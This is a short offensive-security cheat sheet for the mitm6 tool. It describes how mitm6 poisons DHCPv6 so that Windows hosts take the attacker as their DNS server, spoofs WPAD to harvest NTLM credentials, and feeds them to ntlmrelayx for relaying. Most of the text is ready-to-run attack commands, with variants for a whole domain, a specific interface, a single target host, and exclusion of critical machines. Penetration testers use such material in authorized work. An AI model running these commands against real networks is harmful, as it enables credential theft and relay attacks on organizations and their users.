# Mitm6

IPv6 DHCP poisoner. Sends rogue DHCPv6 replies that make Windows hosts use the attacker as their IPv6 DNS server, then spoofs WPAD lookups to harvest NTLM auth. Pair with `ntlmrelayx -6` to relay the resulting hashes.

### Domain poison

Start mitm6 on the domain - replies to DHCPv6 from any host in `$domain`'s DNS suffix.

```sh title:"Mitm6 Poison DHCPv6 for hosts in target domain (pair with ntlmrelayx -6)"
mitm6 -d $domain
```
<!-- cheat
import domain_ip
-->

### Specific interface

Bind to a specific interface when you have multiple network namespaces (tap, tun0, eth1, etc.).

```sh title:"Mitm6 Poison on specific interface"
mitm6 -d $domain -i $iface
```
<!-- cheat
import domain_ip
var iface
-->

### Target single host

Restrict spoofing to a specific FQDN - useful when you want to coerce only one machine and avoid flooding the network.

```sh title:"Mitm6 Spoof DHCPv6 only for a single host FQDN"
mitm6 -d $domain --host-allowlist $target_fqdn
```
<!-- cheat
import domain_ip
var target_fqdn
-->

### Ignore a host

Whitelist mode - poison everyone except specified hosts. Use when DCs/critical hosts should not be touched.

```sh title:"Mitm6 Poison everyone but exclude critical hosts"
mitm6 -d $domain --host-blocklist $skip_fqdn
```
<!-- cheat
import domain_ip
var skip_fqdn
-->
